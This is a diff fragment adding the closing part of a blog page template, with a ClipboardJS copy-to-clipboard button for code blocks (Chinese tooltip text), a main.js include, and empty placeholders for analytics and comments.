+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
